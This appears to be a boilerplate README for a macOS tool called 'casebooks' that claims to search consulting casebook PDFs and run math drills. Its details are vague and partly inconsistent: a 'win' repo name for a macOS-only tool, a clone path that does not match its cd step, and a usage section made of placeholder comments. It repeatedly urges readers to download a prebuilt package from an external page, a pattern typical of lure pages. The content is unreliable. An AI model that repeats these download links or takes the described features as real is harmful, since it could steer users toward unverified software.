# casebooks v2026 - casebook search and study tools 2026

> **Search and study a local MBA consulting casebook library on macOS with full-text lookup, semantic retrieval, PDF page output, and mental math drills in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/paul-berger26/casebooks-win-99525?style=flat-square)](https://github.com/paul-berger26/casebooks-win-99525)

---

<p align="center">
  <a href="https://paul-berger26.github.io/casebooks-win-99525/">
    <img src="https://img.shields.io/badge/Download-casebooks%20Latest-brightgreen?style=for-the-badge" alt="Download casebooks">
  </a>
</p>

> **[Direct Download - casebooks v2026](https://paul-berger26.github.io/casebooks-win-99525/)**

---

[Download Latest Build](https://paul-berger26.github.io/casebooks-win-99525/)

---

## About casebooks

casebooks is a local search and study toolkit for MBA consulting casebooks, built for macOS and shaped around the demands of recruiting prep. It brings case material into one searchable library so you can find the right prompt, exhibit, or drill topic without relying on a remote service.

The tool combines two workflows in one place: casebook discovery and interview practice. You can search by exact text, search by meaning using embeddings, render pages to PNG when you need exhibit images, and run timed mental math drills with topic tracking to keep practice focused.

---

## Features

- Search a library of MBA consulting casebooks from one local collection
- Run full-text searches and jump to the exact PDF page where the match appears
- Use semantic search to find cases by meaning, with no API keys required
- Render PDF pages to PNG for exhibit viewing and reuse
- Practice with a timed mental math drill for interview prep
- Track drill topics to organize repetition and review
- Operate locally with no server process and no database setup
- Work entirely on macOS with a lightweight tool-first workflow

---

## Installation

Clone the repository and open the project folder locally:

    git clone https://github.com/paul-berger26/casebooks-win-99525.git
    cd casebooks

If you are using the downloadable build, grab the latest package from the project page and place it in your preferred location. Launch the app or open the local entry point included with your build to start searching your library.

---

## Usage

Start by pointing casebooks at your local casebook files, then browse or search the library from the interface.

Common workflows include:

1. Search for a case topic, firm, industry, or keyword.
2. Open the matching result and inspect the exact page location.
3. Switch to semantic search when you want related material by meaning rather than direct wording.
4. Render pages to PNG when you need a clean image of a chart or exhibit.
5. Run the mental math drill to practice under time pressure.
6. Review drill topics to see where you need more repetition.

Example workflow:

    # open your local library
    # search for a case
    # review page hits
    # render an exhibit page
    # start a timed drill

---

## Configuration

casebooks is designed to stay local, so configuration is kept simple and close to your files. Settings typically live alongside the project or within your local data directory, depending on how you launch it.

If you want to adjust library paths, search behavior, or drill preferences, update the local configuration file used by your build or launcher. If your setup includes environment variables, define them before starting the app.

Example layout:

    casebooks/
      library/
      config/
      exports/
      drills/

---

## Requirements

- macOS
- A local folder of MBA consulting casebook PDFs
- Enough disk space for your PDF library and any rendered PNG exports
- A machine suitable for local search and page rendering
- Optional embedding support for semantic search workflows

---

## FAQ

**How do I update casebooks?**  
Download the latest build from the project page and replace your existing local copy when needed.

**Do I need a server or database?**  
No. The tool is built for local-only operation.

**Why are some searches returning page images instead of just text?**  
That is expected when you use the page rendering workflow for exhibit pages.

**Can I change where my library lives?**  
Yes. Use the local configuration or launch settings used by your build.

**What if semantic search is not giving the results I expect?**  
Try a more specific query, or fall back to exact text search for direct matches.

**Where can I get help?**  
Check the repository files, configuration, and any release notes bundled with the build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
